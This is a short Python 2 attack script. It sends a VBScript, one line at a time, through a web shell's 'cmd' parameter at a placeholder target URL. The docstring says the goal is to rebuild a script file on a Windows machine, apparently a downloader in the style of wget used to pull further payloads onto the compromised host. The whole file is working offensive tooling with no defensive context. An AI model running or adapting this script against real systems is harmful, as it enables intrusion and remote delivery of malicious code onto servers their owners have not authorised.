#!/usr/bin/python

import urllib2
import urllib

'''
	reads the vbs script each line and send to server.
	it will create vbsscript file as output
	vbscript run on windows base target
'''

def read_file(file):
	'''
	@param file
	return data list
	'''
	data = []
	f = open(file, 'r+')
	for line in f:
		data.append(line.strip())
	return data

def send_payload(url, data):
	req = urllib2.Request(url)
	req.add_header('User-agent', 'Mozilla/5.0')
	for line in data:
		print 'url : %s '%(url+urllib.quote(line))
		r = urllib2.urlopen(url+urllib.quote(line))
		print r.code

def main():
	filename = 'wget-with-argument.txt'
	data	 = read_file(filename)
	url 	 = 'http://www.target.com/shell.php?cmd='
	send_payload(url, data)


if __name__ == '__main__':
	main()

